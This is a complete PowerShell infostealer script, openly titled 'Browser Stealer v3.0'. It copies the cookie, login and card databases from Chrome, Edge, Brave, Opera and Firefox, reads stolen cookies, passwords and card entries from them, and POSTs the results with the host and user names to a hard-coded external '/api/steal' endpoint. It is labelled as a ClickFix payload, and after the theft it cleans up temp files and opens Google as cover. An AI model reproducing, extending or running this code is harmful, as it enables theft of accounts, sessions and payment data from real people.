# ============================================================
# BROWSER STEALER — DEFINITIVE VERSION
# Downloads SQLite from NuGet CDN (always works)
# ============================================================

$ErrorActionPreference = "SilentlyContinue"
$SERVER_URL = "https://cipheranon-production.up.railway.app/api/steal"

function Write-Color {
    param($Msg, $Color)
    Write-Host $Msg -ForegroundColor $Color
}

# ============================================================
# STEP 1: DOWNLOAD SQLITE FROM NUGET
# ============================================================

function Get-SQLite {
    Write-Color "[+] Loading SQLite..." "Cyan"
    
    # Try Microsoft.Data.Sqlite
    try {
        Add-Type -AssemblyName "Microsoft.Data.Sqlite" -ErrorAction Stop
        Write-Color "[+] SQLite loaded (Microsoft.Data.Sqlite)" "Green"
        return "Microsoft"
    } catch {}
    
    # Try System.Data.SQLite (GAC)
    try {
        [System.Data.SQLite.SQLiteConnection]::new() | Out-Null
        Write-Color "[+] SQLite loaded (System.Data.SQLite)" "Green"
        return "System"
    } catch {}
    
    # Try to load from temp
    $dllPath = "$env:TEMP\SQLite.dll"
    if (Test-Path $dllPath) {
        try {
            [System.Reflection.Assembly]::LoadFrom($dllPath) | Out-Null
            Write-Color "[+] SQLite loaded from temp" "Green"
            return "System"
        } catch {}
    }
    
    # ---- DOWNLOAD FROM NUGET ----
    Write-Color "[+] Downloading SQLite from NuGet..." "Cyan"
    
    try {
        # Official NuGet URL for System.Data.SQLite
        $nugetUrl = "https://www.nuget.org/api/v2/package/System.Data.SQLite/1.0.118.0"
        $nupkgPath = "$env:TEMP\sqlite.nupkg"
        
        $webClient = New-Object System.Net.WebClient
        $webClient.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
        $webClient.DownloadFile($nugetUrl, $nupkgPath)
        
        if (Test-Path $nupkgPath -and (Get-Item $nupkgPath).Length -gt 10000) {
            Write-Color "[+] Downloaded NuGet package" "Green"
            
            # Extract the DLL using .NET Zip
            Add-Type -AssemblyName System.IO.Compression.FileSystem
            $zip = [System.IO.Compression.ZipFile]::OpenRead($nupkgPath)
            
            # Find the DLL in the package
            $entry = $zip.Entries | Where-Object { 
                $_.FullName -match "lib/net462/System.Data.SQLite.dll" -or 
                $_.FullName -match "lib/net40/System.Data.SQLite.dll" -or
                $_.FullName -match "lib/netstandard2.0/System.Data.SQLite.dll"
            }
            
            if ($entry) {
                Write-Color "[+] Extracting SQLite DLL..." "Cyan"
                $dllBytes = New-Object byte[] $entry.Length
                $stream = $entry.Open()
                $stream.Read($dllBytes, 0, $dllBytes.Length)
                $stream.Close()
                [System.IO.File]::WriteAllBytes($dllPath, $dllBytes)
                $zip.Dispose()
                
                # Load the DLL
                [System.Reflection.Assembly]::LoadFrom($dllPath) | Out-Null
                Write-Color "[+] SQLite loaded from NuGet!" "Green"
                
                # Cleanup
                Remove-Item $nupkgPath -Force -ErrorAction SilentlyContinue
                return "System"
            }
            $zip.Dispose()
        }
    } catch {
        Write-Color "[!] NuGet download failed: $_" "Red"
    }
    
    Write-Color "[!] SQLite not available" "Red"
    return $null
}

$sqliteType = Get-SQLite

if (-not $sqliteType) {
    Write-Color "[!] Cannot proceed without SQLite" "Red"
    Write-Color "[*] This PC may not have internet access to download SQLite" "Yellow"
    exit
}

# ============================================================
# STEP 2: SQLITE READER
# ============================================================

function Read-SQLite {
    param($DbPath, $Query)
    $result = @()
    if (-not (Test-Path $DbPath)) { return $result }
    try {
        $temp = "$env:TEMP\db_$([System.IO.Path]::GetRandomFileName()).tmp"
        Copy-Item $DbPath $temp -Force
        
        if ($sqliteType -eq "Microsoft") {
            $conn = New-Object Microsoft.Data.Sqlite.SqliteConnection("Data Source=$temp")
            $conn.Open()
            $cmd = $conn.CreateCommand()
            $cmd.CommandText = $Query
            $rdr = $cmd.ExecuteReader()
            while ($rdr.Read()) {
                $row = @{}
                for ($i=0; $i -lt $rdr.FieldCount; $i++) {
                    $n = $rdr.GetName($i)
                    $v = $rdr.GetValue($i)
                    if ($v -ne $null) { $row[$n] = $v }
                }
                $result += $row
            }
            $rdr.Close()
            $conn.Close()
        } else {
            $conn = New-Object System.Data.SQLite.SQLiteConnection("Data Source=$temp;Version=3;")
            $conn.Open()
            $cmd = $conn.CreateCommand()
            $cmd.CommandText = $Query
            $rdr = $cmd.ExecuteReader()
            while ($rdr.Read()) {
                $row = @{}
                for ($i=0; $i -lt $rdr.FieldCount; $i++) {
                    $n = $rdr.GetName($i)
                    $v = $rdr.GetValue($i)
                    if ($v -ne $null) { $row[$n] = $v }
                }
                $result += $row
            }
            $rdr.Close()
            $conn.Close()
        }
        Remove-Item $temp -Force -ErrorAction SilentlyContinue
    } catch {}
    return $result
}

# ============================================================
# STEP 3: CHECK IF BROWSERS EXIST
# ============================================================

function Check-Browser {
    param($Path)
    if (Test-Path $Path) {
        return $true
    }
    return $false
}

Write-Color "" "White"
Write-Color "============================================" "Cyan"
Write-Color "  BROWSER STEALER v3.0" "Green"
Write-Color "  Target: $env:COMPUTERNAME" "Yellow"
Write-Color "============================================" "Cyan"
Write-Color "" "White"

# Check which browsers are installed
$browsersFound = @()
if (Test-Path "$env:LOCALAPPDATA\Google\Chrome") { $browsersFound += "Chrome" }
if (Test-Path "$env:LOCALAPPDATA\Microsoft\Edge") { $browsersFound += "Edge" }
if (Test-Path "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser") { $browsersFound += "Brave" }
if (Test-Path "$env:LOCALAPPDATA\Opera Software\Opera Stable") { $browsersFound += "Opera" }
if (Test-Path "$env:APPDATA\Mozilla\Firefox\Profiles") { $browsersFound += "Firefox" }

if ($browsersFound.Count -eq 0) {
    Write-Color "[!] No browsers found on this PC!" "Red"
    Write-Color "[*] Install Chrome, Edge, or Firefox to test" "Yellow"
    exit
}

Write-Color "[+] Browsers found: $($browsersFound -join ', ')" "Green"
Write-Color "" "White"

# ============================================================
# STEP 4: COOKIE STEALER
# ============================================================

function Get-BrowserCookies {
    param($Path, $Name)
    $cookies = @()
    if (-not (Test-Path $Path)) { return $cookies }
    try {
        $rows = Read-SQLite -DbPath $Path -Query "SELECT host_key, name, value FROM cookies"
        foreach ($r in $rows) {
            if ($r['name'] -and $r['value']) {
                $d = $r['host_key']
                if ($d) { $d = $d -replace '^\.', '' } else { $d = "unknown" }
                $cookies += @{ domain = $d; name = $r['name']; value = $r['value']; browser = $Name }
            }
        }
    } catch {}
    return $cookies
}

function Get-FirefoxCookies {
    $cookies = @()
    $profPath = "$env:APPDATA\Mozilla\Firefox\Profiles"
    if (Test-Path $profPath) {
        $dirs = Get-ChildItem $profPath -Directory
        foreach ($d in $dirs) {
            $f = "$($d.FullName)\cookies.sqlite"
            if (Test-Path $f) {
                try {
                    $rows = Read-SQLite -DbPath $f -Query "SELECT host, name, value FROM moz_cookies"
                    foreach ($r in $rows) {
                        if ($r['name'] -and $r['value']) {
                            $dmn = $r['host']
                            if ($dmn) { $dmn = $dmn -replace '^\.', '' } else { $dmn = "unknown" }
                            $cookies += @{ domain = $dmn; name = $r['name']; value = $r['value']; browser = "Firefox" }
                        }
                    }
                } catch {}
            }
        }
    }
    return $cookies
}

# ============================================================
# STEP 5: PASSWORD STEALER
# ============================================================

function Get-BrowserPasswords {
    param($Path, $Name)
    $pass = @()
    if (-not (Test-Path $Path)) { return $pass }
    try {
        $rows = Read-SQLite -DbPath $Path -Query "SELECT origin_url, username_value, password_value FROM logins"
        foreach ($r in $rows) {
            if ($r['username_value'] -and $r['password_value']) {
                $u = $r['origin_url']
                if ($u) { $u = $u -replace 'https?://', '' } else { $u = "unknown" }
                $pass += @{ url = $u; username = $r['username_value']; password = $r['password_value']; browser = $Name }
            }
        }
    } catch {}
    return $pass
}

function Get-FirefoxPasswords {
    $pass = @()
    $profPath = "$env:APPDATA\Mozilla\Firefox\Profiles"
    if (Test-Path $profPath) {
        $dirs = Get-ChildItem $profPath -Directory
        foreach ($d in $dirs) {
            $f = "$($d.FullName)\logins.json"
            if (Test-Path $f) {
                try {
                    $json = Get-Content $f -Raw | ConvertFrom-Json
                    if ($json.logins) {
                        foreach ($l in $json.logins) {
                            $u = $l.hostname
                            if ($u) { $u = $u -replace 'https?://', '' } else { $u = "unknown" }
                            $pass += @{ url = $u; username = $l.username; password = $l.password; browser = "Firefox" }
                        }
                    }
                } catch {}
            }
        }
    }
    return $pass
}

# ============================================================
# STEP 6: CREDIT CARD STEALER
# ============================================================

function Get-BrowserCards {
    param($Path, $Name)
    $cards = @()
    if (-not (Test-Path $Path)) { return $cards }
    try {
        $rows = Read-SQLite -DbPath $Path -Query "SELECT name_on_card, card_number_encrypted, expiration_month, expiration_year FROM credit_cards"
        foreach ($r in $rows) {
            if ($r['name_on_card'] -and $r['card_number_encrypted']) {
                $cards += @{
                    name = $r['name_on_card']
                    number = $r['card_number_encrypted']
                    month = $r['expiration_month']
                    year = $r['expiration_year']
                    browser = $Name
                }
            }
        }
    } catch {}
    return $cards
}

# ============================================================
# STEP 7: STEAL EVERYTHING
# ============================================================

$allCookies = @()
$allPasswords = @()
$allCards = @()

Write-Color "[+] Chrome cookies..." "Cyan"
$path = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Network\Cookies"
$allCookies += Get-BrowserCookies -Path $path -Name "Chrome"

Write-Color "[+] Edge cookies..." "Cyan"
$path = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Network\Cookies"
$allCookies += Get-BrowserCookies -Path $path -Name "Edge"

Write-Color "[+] Brave cookies..." "Cyan"
$path = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default\Network\Cookies"
$allCookies += Get-BrowserCookies -Path $path -Name "Brave"

Write-Color "[+] Opera cookies..." "Cyan"
$path = "$env:LOCALAPPDATA\Opera Software\Opera Stable\Network\Cookies"
$allCookies += Get-BrowserCookies -Path $path -Name "Opera"

Write-Color "[+] Firefox cookies..." "Cyan"
$allCookies += Get-FirefoxCookies

Write-Color "[+] Chrome passwords..." "Cyan"
$path = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
$allPasswords += Get-BrowserPasswords -Path $path -Name "Chrome"

Write-Color "[+] Edge passwords..." "Cyan"
$path = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Login Data"
$allPasswords += Get-BrowserPasswords -Path $path -Name "Edge"

Write-Color "[+] Brave passwords..." "Cyan"
$path = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default\Login Data"
$allPasswords += Get-BrowserPasswords -Path $path -Name "Brave"

Write-Color "[+] Opera passwords..." "Cyan"
$path = "$env:LOCALAPPDATA\Opera Software\Opera Stable\Login Data"
$allPasswords += Get-BrowserPasswords -Path $path -Name "Opera"

Write-Color "[+] Firefox passwords..." "Cyan"
$allPasswords += Get-FirefoxPasswords

Write-Color "[+] Chrome cards..." "Cyan"
$path = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Web Data"
$allCards += Get-BrowserCards -Path $path -Name "Chrome"

Write-Color "[+] Edge cards..." "Cyan"
$path = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Web Data"
$allCards += Get-BrowserCards -Path $path -Name "Edge"

Write-Color "[+] Brave cards..." "Cyan"
$path = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default\Web Data"
$allCards += Get-BrowserCards -Path $path -Name "Brave"

# ============================================================
# STEP 8: SUMMARY
# ============================================================

Write-Color "" "White"
Write-Color "=== SUMMARY ===" "Green"
Write-Color "Cookies:    $($allCookies.Count)" "Yellow"
Write-Color "Passwords:  $($allPasswords.Count)" "Yellow"
Write-Color "Cards:      $($allCards.Count)" "Yellow"
Write-Color "" "White"

if ($allCookies.Count -eq 0 -and $allPasswords.Count -eq 0 -and $allCards.Count -eq 0) {
    Write-Color "[!] No data stolen!" "Red"
    Write-Color "[*] Possible reasons:" "Yellow"
    Write-Color "  - No saved passwords/cookies in browsers" "Yellow"
    Write-Color "  - Browser is running (locks the database)" "Yellow"
    Write-Color "  - Close the browser and try again" "Yellow"
    Write-Color "" "White"
}

# ============================================================
# STEP 9: SEND TO SERVER
# ============================================================

$payload = @{
    cookies = $allCookies
    passwords = $allPasswords
    cards = $allCards
    system = @{
        hostname = $env:COMPUTERNAME
        username = $env:USERNAME
    }
    source = "clickfix_payload"
    timestamp = (Get-Date).ToString("yyyy-MM-dd HH:mm:ss")
    pcName = $env:COMPUTERNAME
}

Write-Color "[+] Sending data..." "Cyan"
try {
    $json = $payload | ConvertTo-Json -Depth 10
    $bytes = [System.Text.Encoding]::UTF8.GetBytes($json)
    $req = [System.Net.WebRequest]::Create($SERVER_URL)
    $req.Method = "POST"
    $req.ContentType = "application/json"
    $req.ContentLength = $bytes.Length
    $stream = $req.GetRequestStream()
    $stream.Write($bytes, 0, $bytes.Length)
    $stream.Close()
    $resp = $req.GetResponse()
    $resp.Close()
    Write-Color "[+] Data sent successfully!" "Green"
} catch {
    Write-Color "[!] Failed to send: $_" "Red"
}

# ============================================================
# STEP 10: CLEANUP
# ============================================================

Get-ChildItem "$env:TEMP\*.tmp" -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue

Start-Process "https://www.google.com"
Write-Color "[+] Done" "Green"
Write-Color "" "White"
